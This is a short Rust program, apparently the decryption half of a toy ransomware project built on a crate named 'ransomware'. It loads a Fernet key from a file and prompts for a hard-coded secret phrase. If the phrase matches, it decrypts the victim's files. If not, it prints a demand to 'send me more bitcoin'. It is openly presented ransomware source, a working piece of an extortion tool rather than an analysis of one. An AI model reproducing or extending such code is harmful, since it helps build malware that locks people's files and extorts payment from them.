use fernet::Fernet;
use ransomware::get_filenames;
use std::fs;
use std::io;

fn main() -> io::Result<()> {
    let files: Vec<String> = get_filenames()?;

    if !files.is_empty() {
        let key: String = fs::read_to_string("my_key.key")?;
        let fernet = Fernet::new(key.trim()).unwrap();
        let secret_phrase = String::from("rust");
        let mut user_phrase = String::new();

        println!("Enter your secret phrase to decrypt your files.");

        io::stdin()
            .read_line(&mut user_phrase)
            .expect("Failed to get secret phrase");

        if secret_phrase == user_phrase.trim() {
            for file in files {
                let token: String = fs::read_to_string(&file)?;
                let content: String =
                    String::from_utf8(fernet.decrypt(token.trim()).unwrap()).unwrap();

                fs::write(file, content)?;
            }

            println!("Congrats all of your files are decrypted. Happing Working.");
        } else {
            println!("Wrong secret phrase send me more bitcoin.");
        }
    }

    Ok(())
}
